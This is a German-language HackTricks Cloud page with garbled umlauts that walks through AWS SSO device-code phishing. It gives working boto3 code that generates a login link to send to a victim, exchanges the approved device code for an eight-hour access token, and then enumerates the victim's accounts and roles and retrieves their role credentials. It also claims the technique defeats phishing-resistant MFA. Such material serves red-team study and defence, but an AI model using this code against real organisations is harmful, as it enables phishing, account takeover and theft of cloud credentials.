# AWS - Identit√§tszentrum & SSO Unauthentifizierte Aufz√§hlung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## AWS Ger√§tecode-Phishing

Urspr√ºnglich vorgeschlagen in [**diesem Blog-Beitrag**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), ist es m√∂glich, einem Benutzer √ºber AWS SSO einen **Link** zu senden, der es dem **Benutzer erm√∂glicht, wenn er akzeptiert**, dass der Angreifer einen **Token erh√§lt, um den Benutzer zu imitieren** und auf alle Rollen zuzugreifen, auf die der Benutzer im **Identit√§tszentrum** zugreifen kann.

Um diesen Angriff durchzuf√ºhren, sind folgende Voraussetzungen erforderlich:

* Das Opfer muss das **Identit√§tszentrum** verwenden.
* Der Angreifer muss das **Subdom√§ne** kennen, die vom Opfer verwendet wird `<victimsub>.awsapps.com/start`

Nur mit diesen Informationen wird der **Angreifer in der Lage sein, dem Benutzer einen Link zu senden**, der, wenn **akzeptiert**, dem **Angreifer Zugriff auf das AWS-Benutzerkonto** gew√§hrt.

### Angriff

1. **Ermitteln der Subdom√§ne**

Der erste Schritt des Angreifers besteht darin, die Subdom√§ne des Opferunternehmens in ihrem Identit√§tszentrum herauszufinden. Dies kann √ºber **OSINT** oder **Raten + BF** erfolgen, da die meisten Unternehmen hier ihren Namen oder eine Variation ihres Namens verwenden.

Mit diesen Informationen ist es m√∂glich, die Region zu erhalten, in der das Identit√§tszentrum konfiguriert wurde:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Generieren Sie den Link f√ºr das Opfer & Senden Sie ihn**

F√ºhren Sie den folgenden Code aus, um einen AWS SSO-Anmelde-Link zu generieren, damit das Opfer sich authentifizieren kann.\
F√ºr die Demonstration f√ºhren Sie diesen Code in einer Python-Konsole aus und beenden Sie sie nicht, da Sie sp√§ter einige Objekte ben√∂tigen, um das Token zu erhalten:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
3. **Warten Sie, bis das Opfer es akzeptiert**

Wenn das Opfer bereits bei AWS angemeldet war, muss es nur die Berechtigungen akzeptieren. Wenn nicht, muss es sich anmelden und dann die Berechtigungen akzeptieren.\
So sieht die Aufforderung heutzutage aus:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Holen Sie sich das SSO-Zugriffstoken**

Wenn das Opfer die Aufforderung akzeptiert hat, f√ºhren Sie diesen Code aus, um ein SSO-Token zu generieren und sich als Benutzer auszugeben:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
Das SSO-Zugriffstoken ist **8 Stunden lang g√ºltig**.

5. **Benutzer impersonieren**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing des unphishbaren MFA

Es macht Spa√ü zu wissen, dass der vorherige Angriff **auch funktioniert, wenn ein "unphishbarer MFA" (webAuth) verwendet wird**. Dies liegt daran, dass der vorherige **Workflow die verwendete OAuth-Dom√§ne nie verl√§sst**. Anders als bei anderen Phishing-Angriffen, bei denen der Benutzer die Login-Dom√§ne ersetzen muss, ist im Fall des Ger√§tecode-Workflows ein **Code von einem Ger√§t bekannt** und der Benutzer kann sich sogar auf einem anderen Ger√§t anmelden. Wenn die Aufforderung akzeptiert wird, kann das Ger√§t nur durch **Kenntnis des urspr√ºnglichen Codes** die Anmeldeinformationen f√ºr den Benutzer **abrufen**.

F√ºr weitere Informationen dazu [**√ºberpr√ºfen Sie diesen Beitrag**](https://mjg59.dreamwidth.org/62175.html).

### Automatische Tools

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## Referenzen

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
